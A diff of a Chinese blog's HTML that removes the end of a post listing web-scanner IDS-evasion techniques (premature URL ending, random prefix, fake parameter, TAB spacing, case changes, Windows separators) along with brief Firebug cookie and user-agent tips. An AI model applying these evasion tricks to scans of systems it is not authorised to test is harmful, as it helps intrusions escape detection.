-<li>Premature URL ending– 过早结束的URL</li>
-<li>Prepend long random string–优先考虑长随机字符串</li>
-<li>Fake parameter–参数欺骗</li>
-<li>TAB as request space–使用TAB作为命令的分隔符</li>
-<li>Change the case of the URL–使用变化的URL</li>
-<li>Use Windows directory separator()–使用Windows路径分隔符”&quot;</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>Cookie获取：
-Firefox浏览器，可以通过Firbug option网络抓包，Net，然后Cookie，可通过d-debug mod查看设置的cookie是否生效
-User Agent：
-Firefox的默认UserAgent：Default User Agent → Default User Agent（每个浏览器可以进行独立设置）</code></pre></blockquote>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2934,7 +2867,7 @@ Firefox的默认UserAgent：Default User Agent → Default User Agent（每个�
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">54</span>
+                  <span class="site-state-item-count">57</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
